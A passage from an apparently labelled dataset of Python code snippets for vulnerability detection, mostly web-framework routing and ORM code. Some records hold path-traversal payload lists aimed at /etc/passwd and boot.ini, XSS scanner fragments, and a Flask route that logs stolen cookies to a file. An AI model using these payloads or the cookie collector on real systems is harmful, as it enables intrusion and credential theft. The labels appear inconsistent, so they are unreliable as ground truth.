20853, "code": "\"static_university_profile\", kwargs={'org_id': 'TorontoX'}), url(r'^(?i)university_profile/RiceX$', 'courseware.views.static_university_profile', name=\"static_university_profile\", kwargs={'org_id': 'RiceX'}), url(r'^", "label": 0}, {"snippet_id": 49085, "code": "): if self.is_ordered(): return self.current_columns.index(self.column_id) +1 def is_ordered(self): return self.column_id in self.current_columns def is_reverse(self): for column in self.query_order.split", "label": 0}, {"snippet_id": 50086, "code": " is lost/timed out\" try: del self.requests[csessid] except KeyError: pass def _keepalive(self): \"\"\" Callback for checking the connection is still alive. \"\"\" now=time.time() to_remove=[] keep_alives=((csessid", "label": 0}, {"snippet_id": 377, "code": "=check_xss_impact(xss_request.headers) logs.logging.info(\"%s is vulnerable to XSS\",url) print \"%s[{0}]{1} is vulnerable to XSS%s\".format(impact,url)%(api_logger.G, api_logger.W) attack_result={ \"id\": 11", "label": 1}, {"snippet_id": 17108, "code": "?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/(?P<cohort_id>[0-9]+)/delete$', 'course_groups.views.remove_user_from_cohort', name=\"remove_from_cohort\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts", "label": 0}, {"snippet_id": 42904, "code": "(doctype, docname, \t\t\t\t\t\t'name', cache=True)) \t\t\t\telse: \t\t\t\t\tvalues_to_fetch=['name'] +[_df.fetch_from.split('.')[-1] \t\t\t\t\t\tfor _df in fields_to_fetch] \t\t\t\t\t \t\t\t\t\tvalues=frappe.db.get_value(doctype, docname,", "label": 0}, {"snippet_id": 26253, "code": "=data.get('name_parts') if self.validate_vat_id and self.instance.vat_id_validated and 'vat_id' not in self.changed_data: pass elif self.validate_vat_id and data.get('is_business') and data.get('country')", "label": 0}, {"snippet_id": 8309, "code": "'ENABLE_LMS_MIGRATION'): urlpatterns +=( url(r'^migrate/modules$', 'lms_migration.migrate.manage_modulestores'), url(r'^migrate/reload/(?P<reload_dir>[^/]+)$', 'lms_migration.migrate.manage_modulestores')", "label": 0}, {"snippet_id": 41656, "code": "=load_doctype_module(doctype, module_name) \t\t\tclassname=doctype.replace(\" \", \"\").replace(\"-\", \"\") \t\t\tif hasattr(module, classname): \t\t\t\t_class=getattr(module, classname) \t\t\t\tif issubclass(_class, BaseDocument", "label": 0}, {"snippet_id": 6641, "code": " @property def status_test_usernames(self): \"\"\" Get list of usernames valid for use with the /status URL. If this list is['*'], all usernames are allowed for /status. :return: list of usernames :rtype:", "label": 0}, {"snippet_id": 25764, "code": " widget=forms.Textarea, initial=initial.answer if initial else None, ) elif q.type==Question.TYPE_CHOICE: field=forms.ModelChoiceField( queryset=q.options, label=q.question, required=q.required, help_text", "label": 0}, {"snippet_id": 15400, "code": ".report_dir.makedirs_p() test_utils.clean_reports_dir() if not(self.fasttest or self.skip_clean or self.testsonly): test_utils.clean_test_files() msg=colorize('green', \"Checking for mongo, memchache, and mysql.", "label": 0}, {"snippet_id": 13054, "code": ".views.signin_user', name=\"signin_user\"), url(r'^register$', 'student.views.register_user', name=\"register_user\"), url(r'^admin_dashboard$', 'dashboard.views.dashboard'), url(r'^change_email$', 'student", "label": 0}, {"snippet_id": 382, "code": " logs.logging.info(\"%s is vulnerable to XSS\",url) print \"%s[{0}]{1} is vulnerable to XSS%s\".format(impact,url)%(api_logger.G, api_logger.W) attack_result={ \"id\": 11, \"scanid\": scanid, \"url\": url, \"alert", "label": 1}, {"snippet_id": 24564, "code": " been seeded' except FixtureError: pass if self.serversonly: self.run_servers_continuously() def __exit__(self, exc_type, exc_value, traceback): super(BokChoyTestSuite, self).__exit__(exc_type, exc_value", "label": 0}, {"snippet_id": 34165, "code": " `frappe.model.document.Document`. \t:param doctype: DocType name as string.\"\"\" \tfrom frappe.model.document import Document \tglobal _classes \tif not doctype in _classes: \t\tmodule_name, custom=frappe.db.get_value", "label": 0}, {"snippet_id": 8750, "code": "{'org_id': 'EPFLx'}), url(r'^university_profile/(?P<org_id>[^/]+)$', 'courseware.views.university_profile', name=\"university_profile\"), ) urlpatterns +=( url(r'^404$', 'static_template_view.views.render", "label": 0}, {"snippet_id": 23639, "code": "\n\"\"\" Tests for the bok-choy paver commands themselves. Run just this test with: paver test_lib -t pavelib/paver_tests/test_paver_bok_choy_cmds.py \"\"\" import os import unittest from mock import patch, call", "label": 0}, {"snippet_id": 54827, "code": "=is_mobile(self.request.META['HTTP_USER_AGENT']) return context def test_func(self): return self.request.user==self.get_object().author class ArticleDelete(UserPassesTestMixin, DeleteView): \"\"\"\u5904\u7406\u5220\u9664Article\u7684\u64cd\u4f5c\"", "label": 0}, {"snippet_id": 20810, "code": "'auth_password_reset_done'), url(r'^heartbeat$', include('heartbeat.urls')), ) if not settings.MITX_FEATURES[\"USE_CUSTOM_THEME\"]: urlpatterns +=( url(r'^(?i)university_profile/WellesleyX$', 'courseware", "label": 0}, {"snippet_id": 22216, "code": "(r'^pending_name_changes$', 'student.views.pending_name_changes'), url(r'^event$', 'track.views.user_track'), url(r'^t/(?P<template>[^/]*)$', 'static_template_view.views.index'), url(r'^accounts/login$'", "label": 0}, {"snippet_id": 31140, "code": " tmp_config_path+script+\" MASTER \"+interface+\" \"+vrrpip+\" \"+kp]) \tfunct.ssh_command(slave,[\"sudo chmod +x \"+tmp_config_path+script, tmp_config_path+script+\" BACKUP \"+interface+\" \"+vrrpip+\" \"+kp]) \t\t\t \tos.system(\"rm", "label": 0}, {"snippet_id": 54749, "code": " if d in useragent: return True return False class ArticleFormView(LoginRequiredMixin, FormView): \"\"\"\u5904\u7406\u6dfb\u52a0 Article \u65f6\u7684\u8868\u5355\"\"\" model=Article template_name='post.html' context_object_name='articles' form_class", "label": 0}, {"snippet_id": 37548, "code": "{\"name\": _(\"Home\"), \"route\": \"/\"}] \tlist_context.update(frappe.get_doc(\"Blog Settings\", \"Blog Settings\").as_dict(no_default_fields=True)) \treturn list_context def get_children(): \treturn frappe.db.sql(", "label": 0}, {"snippet_id": 15114, "code": "\n\"\"\" Class used for defining and running Bok Choy acceptance test suite \"\"\" from time import sleep from urllib import urlencode from common.test.acceptance.fixtures.course import CourseFixture, FixtureError", "label": 0}, {"snippet_id": 39216, "code": ".meta.get_table_fields(): \t\t\tchildren=self.get(df.fieldname) or[] \t\t\tdoc[df.fieldname]=[d.as_dict(no_nulls=no_nulls) for d in children] \t\tif no_nulls: \t\t\tfor k in list(doc): \t\t\t\tif doc[k] is None: \t\t\t\t", "label": 0}, {"snippet_id": 25693, "code": "=(initial.answer==\"True\") else: initialbool=False field=forms.BooleanField( label=q.question, required=q.required, help_text=help_text, initial=initialbool, widget=widget, ) elif q.type==Question.TYPE_NUMBER", "label": 1}, {"snippet_id": 18643, "code": "'course_groups.views.remove_user_from_cohort', name=\"remove_from_cohort\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/debug$', 'course_groups.views.debug_cohort_mgmt', name=\"debug_cohort_mgmt\")", "label": 0}, {"snippet_id": 18639, "code": "]+)/cohorts/(?P<cohort_id>[0-9]+)/delete$', 'course_groups.views.remove_user_from_cohort', name=\"remove_from_cohort\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/debug$', 'course_groups.views", "label": 0}, {"snippet_id": 39242, "code": " default_fields: \t\t\t\t\tdel doc[k] \t\tfor key in(\"_user_tags\", \"__islocal\", \"__onload\", \"_liked_by\", \"__run_link_triggers\"): \t\t\tif self.get(key): \t\t\t\tdoc[key]=self.get(key) \t\treturn doc \tdef as_json(self)", "label": 0}, {"snippet_id": 42718, "code": " \t\t\t\t\t_(\"Row\"), self.idx, _(\"Value missing for\"), _(df.label)) \t\t\telse: \t\t\t\treturn _(\"Error: Value missing for{0}:{1}\").format(_(df.parent), _(df.label)) \t\tmissing=[] \t\tfor df in self.meta.get(\"fields\"", "label": 0}, {"snippet_id": 21405, "code": "[^/]+/[^/]+/[^/]+)/courseware/(?P<chapter>[^/]*)/$', 'courseware.views.index', name=\"courseware_chapter\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/courseware/(?P<chapter>[^/]*)/(?P<section>[^/]", "label": 0}, {"snippet_id": 41822, "code": "\t\t\t\treturn _filter(self.get_all_children(), key, limit=limit) \t\t\tif filters: \t\t\t\tif isinstance(filters, dict): \t\t\t\t\tvalue=_filter(self.__dict__.get(key,[]), filters, limit=limit) \t\t\t\telse: \t\t\t\t\tdefault", "label": 0}, {"snippet_id": 16014, "code": "-dir={report_dir} ' '--pa11ycrawler-deny-url-matcher={dont_go_here} ' '--pa11y-reporter=\"{reporter}\" ' '--depth-limit={depth} ' ).format( start_urls=' '.join(self.start_urls), allowed_domains='localhost", "label": 0}, {"snippet_id": 27904, "code": " redirect(self, url, **kwargs): \"\"\"Explicitly converts url to 'str', because webapp2.RequestHandler.redirect strongly requires 'str' but url might be an unicode string.\"\"\" super(Handler, self).redirect(str", "label": 1}, {"snippet_id": 18534, "code": "/get_problem_list$', 'open_ended_grading.staff_grading_service.get_problem_list', name='staff_grading_get_problem_list'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/open_ended_problems$', 'open_ended_grading", "label": 0}, {"snippet_id": 24907, "code": ".verbosity_processes_string()) ] if self.pdb: cmd.append(\"--pdb\") if self.save_screenshots: cmd.append(\"--with-save-baseline\") cmd.append(self.extra_args) cmd=(\" \").join(cmd) return cmd class Pa11yCrawler(BokChoyTestSuite): \"\"\"", "label": 0}, {"snippet_id": 47773, "code": " forward to if nothing was specified :return: The crafted HttpResponse \"\"\" forward_url=default_forward_url if request.GET.get(\"redirect\"): forward_url=request.GET[\"redirect\"] if not request.user.is_authenticated", "label": 0}, {"snippet_id": 21611, "code": "/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts$', 'course_groups.views.list_cohorts', name=\"cohorts\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/add$', 'course_groups.views.add_cohort', name=\"add_cohort", "label": 0}, {"snippet_id": 44974, "code": " params_form.cleaned_data]) job_id=_submit_workflow(request.user, request.fs, request.jt, workflow, mapping) request.info(_('Workflow submitted')) return redirect(reverse('oozie:list_oozie_workflow', kwargs=", "label": 0}, {"snippet_id": 15262, "code": " to use in tests. Recommendation is that this is less than or equal to the number of available processors. verify_xss -when set, check for XSS vulnerabilities in the page HTML. See nosetest documentation", "label": 0}, {"snippet_id": 53176, "code": "=Coordinator(document=Document2.objects.get(id=doc_id)) ParametersFormSet=formset_factory(ParameterForm, extra=0) if request.method=='POST': params_form=ParametersFormSet(request.POST) if params_form.is_valid", "label": 0}, {"snippet_id": 26569, "code": "../etc/passwd%00', '../../../../../../../etc/passwd%00', '../../../../../../../../etc/passwd%00', '%2e%2e%2f%2e%2e%2fetc%2fpasswd%00', '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd%00', '%2e%2e%2f%2e%2e%2f%2e", "label": 0}, {"snippet_id": 1282, "code": " records: data.pop('_id') try: data= ast.literal_eval(json.dumps(data)) if data['scanid']: if data['scanid'] not in scanids: scanids.append({\"scanid\": data['scanid'], \"name\": data['name'], \"url\": data[", "label": 0}, {"snippet_id": 12647, "code": "'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/news$', 'courseware.views.news', name=\"news\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/discussion/', include('django_comment_client.urls')) ) urlpatterns +=", "label": 0}, {"snippet_id": 26480, "code": "./../../../../../../../etc/passwd', '%2e%2e%2f%2e%2e%2fetc%2fpasswd', '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd', '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd', '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f", "label": 0}, {"snippet_id": 40810, "code": ".fieldtype, value) \tdef _extract_images_from_text_editor(self): \t\tfrom frappe.utils.file_manager import extract_images_from_doc \t\tif self.doctype !=\"DocType\": \t\t\tfor df in self.meta.get(\"fields\",{\"fieldtype", "label": 0}, {"snippet_id": 31394, "code": "*1000-60*100000, x_max.timestamp()*1000) \t\t\t) \t\t\t \t\thover=HoverTool( \t\t\ttooltips=[ \t\t\t\t(\"Connections\", \"@curr_con\"), \t\t\t\t(\"SSL connections\", \"@curr_ssl_con\"), \t\t\t\t(\"Sessions rate\", \"@sess_rate\") \t\t\t], ", "label": 0}, {"snippet_id": 12815, "code": "'openid-provider-login'), url(r'^openid/provider/login/(?:.+)$', 'external_auth.views.provider_identity', name='openid-provider-login-identity'), url(r'^openid/provider/identity/$', 'external_auth.views", "label": 0}, {"snippet_id": 29334, "code": " +\"&& sudo rm -f \" +tmp_file] \t\telif kwargs.get(\"just_save\")==\"save\": \t\t\tcommands=[ \"sudo haproxy -q -c -f \" +tmp_file +\"&& sudo mv -f \" +tmp_file +\" \" +sql.get_setting('haproxy_config_path')] \t\telse: ", "label": 0}, {"snippet_id": 34778, "code": "\tself.__dict__[key]=None \t\t\tif key in(\"idx\", \"docstatus\") and self.__dict__[key] is None: \t\t\t\tself.__dict__[key]=0 \t\tfor key in self.get_valid_columns(): \t\t\tif key not in self.__dict__: \t\t\t\tself.__dict__", "label": 0}, {"snippet_id": 22814, "code": " url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/$', 'staticbook.views.pdf_index', name=\"pdf_book\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>", "label": 1}, {"snippet_id": 14286, "code": "( url(r'^shib-login/$', 'external_auth.views.shib_login', name='shib-login'), ) if settings.MITX_FEATURES.get('RESTRICT_ENROLL_BY_REG_METHOD'): urlpatterns +=( url(r'^course_specific_login/(?P<course_id", "label": 0}, {"snippet_id": 34265, "code": ": \t\t\tself.__setup__() \t@property \tdef meta(self): \t\tif not hasattr(self, \"_meta\"): \t\t\tself._meta=frappe.get_meta(self.doctype) \t\treturn self._meta \tdef update(self, d): \t\tif \"doctype\" in d: \t\t\tself.set", "label": 0}, {"snippet_id": 54747, "code": ", \"iPod\"] for d in devices: if d in useragent: return True return False class ArticleFormView(LoginRequiredMixin, FormView): \"\"\"\u5904\u7406\u6dfb\u52a0 Article \u65f6\u7684\u8868\u5355\"\"\" model=Article template_name='post.html' context_object_name", "label": 0}, {"snippet_id": 51103, "code": ": return obj.schedule.remaining_estimate(last_run_at=obj.last_run_at) else: z, y=obj.schedule.is_due(last_run_at=datetime.now(pytz.utc)) date=datetime.now(pytz.utc) +timedelta(seconds=y) return naturaltime", "label": 0}, {"snippet_id": 21411, "code": "'courseware.views.index', name=\"courseware_chapter\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/courseware/(?P<chapter>[^/]*)/(?P<section>[^/]*)/$', 'courseware.views.index', name=\"courseware_section\"", "label": 0}, {"snippet_id": 10236, "code": ", self._expected_command(name=name, verify_xss=True)) def test_verify_xss_env_var(self): self.env_var_override.set('VERIFY_XSS', 'True') with self.env_var_override: suite=BokChoyTestSuite('') name='tests", "label": 1}, {"snippet_id": 3188, "code": ": headers, \"req_body\":body, \"res_headers\": xss_request.headers,\"res_body\": xss_request.text} dbupdate.insert_record(attack_result) db_update=True vul_param +=key else: result=True if vul_param=='': post_vul_param", "label": 0}, {"snippet_id": 47112, "code": " Markup(\"<pre>{0}</pre>\".format( json.dumps(m.json, indent=2, sort_keys=True))) ) column_filters=('created', 'updated',) column_default_sort=('updated', True) page_size=25 def delete_model(self, model):", "label": 1}, {"snippet_id": 54541, "code": "'title', 'category', 'content'] class CommentForm(forms.ModelForm): class Meta: model=Comment fields=['content'] class UserDetail(DetailView): model=User template_name='user.html' def get_context_data(self,", "label": 0}, {"snippet_id": 30634, "code": "\tminut=form.getvalue('minut') \thour1=form.getvalue('hour1') \tminut1=form.getvalue('minut1') \tdate=hour+':'+minut \tdate1=hour1+':'+minut1 \t \tif grep is not None: \t\tgrep_act ='|grep' \telse: \t\tgrep_act='' \t", "label": 0}, {"snippet_id": 33432, "code": "(\\%4D))((\\%67)|g|(\\%47))[^\\n]+((\\%3E)|>)\") \t\t\tif any(x in _payload for x in \"\\\"'><;/\"): \t\t\t\treturn _payload \tdef check(self, url, payload, response, parameter): \t\tfor injection_types in self.signatures", "label": 1}, {"snippet_id": 13346, "code": " 'jobs.html'}, name=\"jobs\"), url(r'^press$', 'student.views.press', name=\"press\"), url(r'^media-kit$', 'static_template_view.views.render', {'template': 'media-kit.html'}, name=\"media-kit\"), url(r'^faq$", "label": 0}, {"snippet_id": 46030, "code": " collection_id: return admin_collections(request, True, is_mobile) try: collection_doc=Document2.objects.get(id=collection_id) if USE_NEW_EDITOR.get(): collection_doc.can_read_or_exception(request.user) else", "label": 0}, {"snippet_id": 3708, "code": " return payload_list def check_xss_impact(res_headers): print \"response header\",res_headers['Content-Type'] if res_headers['Content-Type']: if res_headers['Content-Type'].find('application/json') !=-1 or", "label": 0}, {"snippet_id": 13413, "code": "'^submit_feedback$', 'util.views.submit_feedback'), ) for key, value in settings.MKTG_URL_LINK_MAP.items(): if value is None: continue if key==\"ROOT\" or key==\"COURSES\" or key==\"FAQ\": continue template=\"%s.html\" ", "label": 0}, {"snippet_id": 42157, "code": "\", \"Float\", \"Percent\") and not isinstance(d[fieldname], float): \t\t\t\t\td[fieldname]=flt(d[fieldname]) \t\t\t\telif df.fieldtype in(\"Datetime\", \"Date\", \"Time\") and d[fieldname]==\"\": \t\t\t\t\td[fieldname]=None \t\t\t", "label": 0}, {"snippet_id": 16340, "code": "', 'courseware.views.university_profile', name=\"university_profile\"), ) urlpatterns +=( url(r'^404$', 'static_template_view.views.render', {'template': '404.html'}, name=\"404\"), ) if not settings.MITX_FEATURES", "label": 0}, {"snippet_id": 8898, "code": "(url(r'^reprofile$', 'perfstats.views.end_profile'),) if settings.WIKI_ENABLED: from wiki.urls import get_pattern as wiki_pattern from django_notify.urls import get_pattern as notify_pattern urlpatterns +", "label": 0}, {"snippet_id": 44771, "code": ", node['id'][:4]) return HttpResponse(json.dumps(response), mimetype=\"application/json\") def action_parameters(request): response={'status': -1} parameters=set() try: node_data=json.loads(request.POST.get", "label": 0}, {"snippet_id": 7273, "code": "'template': 'media-kit.html'}, name=\"media-kit\"), url(r'^faq$', 'static_template_view.views.render', {'template': 'faq.html'}, name=\"faq_edx\"), url(r'^help$', 'static_template_view.views.render', {'template'", "label": 0}, {"snippet_id": 27696, "code": "]=make_login_url(self.request.url) values['logout_url']=make_logout_url(dest_url=self.request.url) template=_JINJA_ENVIRONMENT.get_template(path) self._add_security_response_headers() self.response.headers", "label": 0}, {"snippet_id": 54373, "code": ") user_agent.grid(row=4, column=1) user_agent.config(width=30) payload.grid(row=5, column=1) payload.config(width=30) proxy.grid(row=6, column=1) proxy.current(0) proxy.config(width=30) refresh.grid(row", "label": 0}, {"snippet_id": 55136, "code": "'action']] action_status=action_function( form, request.user, active_translations, locale, ) if action_status.get('error'): return JsonResponse(action_status) invalid_translation_count=len(action_status.get(", "label": 0}, {"snippet_id": 31748, "code": "\tlist_name=form.getvalue('bwlists_create').split('.')[0] \tlist_name +='.lst' \tlist=os.path.dirname(os.getcwd())+\"/\"+sql.get_setting('lists_path')+\"/\"+form.getvalue('group')+\"/\"+form.getvalue('color')+\"", "label": 0}, {"snippet_id": 23470, "code": "-login-identity'), url(r'^openid/provider/identity/$', 'external_auth.views.provider_identity', name='openid-provider-identity'), url(r'^openid/provider/xrds/$', 'external_auth.views.provider_xrds', name", "label": 0}, {"snippet_id": 39273, "code": "(fieldname).options \tdef get_parentfield_of_doctype(self, doctype): \t\tfieldname=[df.fieldname for df in self.meta.get_table_fields() if df.options==doctype] \t\treturn fieldname[0] if fieldname else None", "label": 0}, {"snippet_id": 22778, "code": "/]+/[^/]+)/syllabus$', 'courseware.views.syllabus', name=\"syllabus\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/book/(?P<book_index>[^/]*)/$', 'staticbook.views.index', name=\"book\"), url(r'^courses", "label": 1}, {"snippet_id": 34913, "code": " \tdef as_json(self): \t\treturn frappe.as_json(self.as_dict()) \tdef get_table_field_doctype(self, fieldname): \t\treturn self.meta.get_field(fieldname).options \tdef get_parentfield_of_doctype(self, doctype", "label": 0}, {"snippet_id": 42997, "code": "=2): \t\t\t\t\t\tcancelled_links.append((df.fieldname, docname, get_msg(df, docname))) \t\treturn invalid_links, cancelled_links \tdef _validate_selects(self): \t\tif frappe.flags.in_import: \t\t\treturn \t\tfor df in", "label": 0}, {"snippet_id": 23422, "code": "', 'external_auth.views.course_specific_login', name='course-specific-login'), url(r'^course_specific_register/(?P<course_id>[^/]+/[^/]+/[^/]+)/$', 'external_auth.views.course_specific_register', name=", "label": 0}, {"snippet_id": 45207, "code": "/coordinator_editor.mako', request,{ 'coordinator_json': coordinator.json, 'credentials_json': json.dumps(credentials.credentials.keys()), 'workflows_json': json.dumps(workflows), 'doc1_id': doc.doc.get", "label": 1}, {"snippet_id": 20541, "code": "'pa11ycrawler json-to-html --pa11ycrawler-reports-dir={report_dir}' ).format(report_dir=self.pa11y_report_dir) sh(cmd_str) @property def cmd(self): \"\"\" Runs pa11ycrawler as staff user against the test course. \"\"", "label": 0}, {"snippet_id": 37613, "code": ": \t\tclear_cache(blog) \tclear_cache(\"writers\") def get_blog_category(route): \treturn frappe.db.get_value(\"Blog Category\",{\"name\": route}, \"title\") or route def get_blog_list(doctype, txt=None, filters=None", "label": 0}, {"snippet_id": 14057, "code": "'course_groups.views.users_in_cohort', name=\"list_cohort\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/(?P<cohort_id>[0-9]+)/add$', 'course_groups.views.add_users_to_cohort', name=\"add_to_cohort\")", "label": 0}, {"snippet_id": 24191, "code": "(suite.pa11y_report_dir, suite.start_urls) ) def test_get_test_course(self): suite=Pa11yCrawler('') suite.get_test_course() self._mock_sh.assert_has_calls([ call( 'wget{targz} -O{dir}demo_course.tar.gz", "label": 0}, {"snippet_id": 54279, "code": ".http(200) global target target=Entry(main) target.insert(0,'http://') global cookie cookie=Entry(main) global method method=ttk.Combobox(main, values=[\"GET & POST\", \"GET\", \"POST\"]) global timeout timeout", "label": 0}, {"snippet_id": 47948, "code": "[\"allowed_reservations\"]) user.displayName=displayname user.authuser=auth_user user.dect=dect user.notes=notes user.active=True user.save() pass pass except Exception as e: return HttpResponseBadRequest", "label": 0}, {"snippet_id": 38374, "code": ") if conditions else \"\" \t\t} \tposts=frappe.db.sql(query, as_dict=1) \tfor post in posts: \t\tpost.cover_image=find_first_image(post.content) \t\tpost.published=global_date_format(post.creation) \t\tpost.content", "label": 0}, {"snippet_id": 26746, "code": "%2e%2e%2f%2e%2e%2fboot%2eini', '../../boot.ini%00', '../../../boot.ini%00', '../../../../boot.ini%00', '../../../../../boot.ini%00', '../../../../../../boot.ini%00', '../../../../../../../boot.ini%00', ", "label": 0}, {"snippet_id": 19888, "code": ".testsonly=kwargs.get('testsonly', False) self.test_spec=kwargs.get('test_spec', None) self.default_store=kwargs.get('default_store', None) self.verbosity=kwargs.get('verbosity', DEFAULT_VERBOSITY) self", "label": 0}, {"snippet_id": 12420, "code": "'staff_grading_get_next'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading/save_grade$', 'open_ended_grading.staff_grading_service.save_grade', name='staff_grading_save_grade'), url(r'^courses", "label": 0}, {"snippet_id": 10931, "code": "./manage.py lms --settings bok_choy flush --traceback --noinput\") bokchoy_utils.clear_mongo() def verbosity_processes_string(self): \"\"\" Multiprocessing, xunit, color, and verbosity do not work well together", "label": 0}, {"snippet_id": 37011, "code": "=None, filters=None, limit_start=0, limit_page_length=20, order_by=None): \tconditions=[] \tif filters: \t\tif filters.blogger: \t\t\tconditions.append('t1.blogger=\"%s\"' % frappe.db.escape(filters.blogger)) \t", "label": 0}, {"snippet_id": 2539, "code": " xss_post_request.text.find(decoded_payload) !=-1: impact=check_xss_impact(xss_post.body) if db_update is not True: attack_result={ \"id\": 11, \"scanid\": scanid, \"url\": xss_url, \"alert\": \"Cross Site Scripting", "label": 1}, {"snippet_id": 12280, "code": "/]+)/courseware/?$', 'courseware.views.index', name=\"courseware\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/courseware/(?P<chapter>[^/]*)/$', 'courseware.views.index', name=\"courseware_chapter\")", "label": 0}, {"snippet_id": 8548, "code": "'^event$', 'track.views.user_track'), url(r'^t/(?P<template>[^/]*)$', 'static_template_view.views.index'), url(r'^accounts/login$', 'student.views.accounts_login', name=\"accounts_login\"), url(r'^login_ajax$", "label": 0}, {"snippet_id": 14395, "code": "): urlpatterns +=( url(r'^migrate/modules$', 'lms_migration.migrate.manage_modulestores'), url(r'^migrate/reload/(?P<reload_dir>[^/]+)$', 'lms_migration.migrate.manage_modulestores'), url(r'^migrate/reload", "label": 0}, {"snippet_id": 49944, "code": " chat program. /webclientdata -this url is called by the ajax chat using POST requests(long-polling when necessary) The WebClient resource in this module will handle these requests and act as a gateway", "label": 0}, {"snippet_id": 50826, "code": " screenreader: text=parse_ansi(text, strip_ansi=True, xterm256=False, mxp=False) text=_RE_SCREENREADER_REGEX.sub(\"\", text) cmd=\"prompt\" if prompt else \"text\" if raw: args[0]=text else: args[0]=parse_html(text", "label": 0}, {"snippet_id": 34269, "code": " \t@property \tdef meta(self): \t\tif not hasattr(self, \"_meta\"): \t\t\tself._meta=frappe.get_meta(self.doctype) \t\treturn self._meta \tdef update(self, d): \t\tif \"doctype\" in d: \t\t\tself.set(\"doctype\", d.get(\"doctype", "label": 0}, {"snippet_id": 11469, "code": " django.conf import settings from django.conf.urls import patterns, include, url from django.contrib import admin from django.conf.urls.static import static from. import one_time_startup import django.contrib", "label": 0}, {"snippet_id": 30429, "code": ":'+minut \tdate1=hour1+':'+minut1 \t \tif grep is not None: \tgrep_act ='|grep' \telse: \t\tgrep_act='' \t\tgrep='' \tsyslog_server_enable=sql.get_setting('syslog_server_enable') \tif syslog_server_enable is None", "label": 0}, {"snippet_id": 23778, "code": " def test_default(self): suite=BokChoyTestSuite('') name='tests' self.assertEqual(suite.cmd, self._expected_command(name=name)) def test_suite_spec(self): spec='test_foo.py' suite=BokChoyTestSuite('', test_spec", "label": 0}, {"snippet_id": 28242, "code": "=form.getvalue('save') \taftersave=1 \ttry: \t\twith open(cfg, \"a\") as conf: \t\t\tconf.write(config) \texcept IOError: \t\terror=\"Can't read import config file\" \t \tMASTERS=sql.is_master(serv) \tfor master in MASTERS", "label": 0}, {"snippet_id": 51889, "code": " }, } CELERY_accept_content=['pickle', 'yaml'] CELERY_task_serializer='pickle' CELERY_result_serializer='pickle' CELERY_BROKER_URL=os.environ.get('BROKER', 'redis://localhost:6379/0') ENABLE_UTC=True CELERY_ACCEPT_CONTENT", "label": 0}, {"snippet_id": 6097, "code": "//localhost:8550/', 'insecure_cookies': '0', } _CONFIG_SECTION='eduid_idp' class IdPConfig(object): \"\"\" Class holding IdP application configuration. Loads configuration from an INI-file at instantiation", "label": 0}, {"snippet_id": 44653, "code": "=json.loads(request.POST.get('node', '{}')) properties=NODES[node['widgetType']].get_mandatory_fields() workflows=[] if node['widgetType']=='subworkflow-widget': workflows=_get_workflows(request.user) response", "label": 0}, {"snippet_id": 1757, "code": " return_alerts(scanid): print \"ScanID is \",scanid result=fetch_records(scanid) resp=jsonify(result) resp.headers[\"Access-Control-Allow-Origin\"]=\"*\" return resp @app.route('/', defaults={'page': 'scan.html", "label": 0}, {"snippet_id": 44272, "code": "{ 'workflows_json': json.dumps(workflows) }) @check_document_access_permission() def edit_workflow(request): workflow_id=request.GET.get('workflow') if workflow_id: wid={} if workflow_id.isdigit(): wid", "label": 1}, {"snippet_id": 41212, "code": "\tlist_context.sub_title=_(\"Posts filed under{0}\").format(category_title) \t\tlist_context.title=category_title \telif frappe.local.form_dict.blogger: \t\tblogger=frappe.db.get_value(\"Blogger\",{\"name\": frappe.local", "label": 0}, {"snippet_id": 53990, "code": ") def steal(): \tif request.method==\"GET\" or request.method==\"POST\": \t\tdata=request.values \t\tcookie=data.get('cookie') \t\twith open('cookies.txt',mode='a') as f: \t\t\tf.write('\\n---------------------------", "label": 0}, {"snippet_id": 40851, "code": "[\"in\", \"val\"], \"key\":[\"not in\", \"val\"], \"key\": \"^val\", \t\t\"key\": True(exists), \"key\": False(does not exist)}\"\"\" \tout, _filters=[],{} \tif not data: \t\treturn out \t \tif filters: \t\tfor f in filters: \t\t\tfval", "label": 0}, {"snippet_id": 27958, "code": " upload_key=self.request.get('upload_key') if not upload_key: return None blob_info=storage.GcsBlobInfo.from_key(upload_key) if not blob_info: raise helpers.EarlyExitException('Failed to upload.', 500)", "label": 0}, {"snippet_id": 52035, "code": ".models2 import Node, Workflow, Coordinator, Bundle, NODES, WORKFLOW_NODE_PROPERTIES, import_workflows_from_hue_3_7,\\ find_dollar_variables, find_dollar_braced_variables LOG=logging.getLogger(__name__)", "label": 0}, {"snippet_id": 46189, "code": " if request.GET.get('format', 'plain')=='json': return JsonResponse({ 'collection': collection.get_props(request.user), 'query': query, 'initial':{ 'collections': collections, 'layout': DEFAULT_LAYOUT,", "label": 0}, {"snippet_id": 46326, "code": "{},\"offset\":0,\"isLoading\":True,\"klass\":\"card card-widget span12\"}]}], \"drops\":[\"temp\"],\"klass\":\"card card-home card-column span10\"} ], 'is_latest': LATEST.get(), 'engines': get_engines(request.user) })", "label": 0}, {"snippet_id": 964, "code": " if xss_result is True: print \"%s[{0}]{1} is vulnerable to XSS%s\".format(impact,url)%(api_logger.G, api_logger.W) attack_result={ \"id\": 11, \"scanid\": scanid, \"url\": url, \"alert\": \"Cross Site 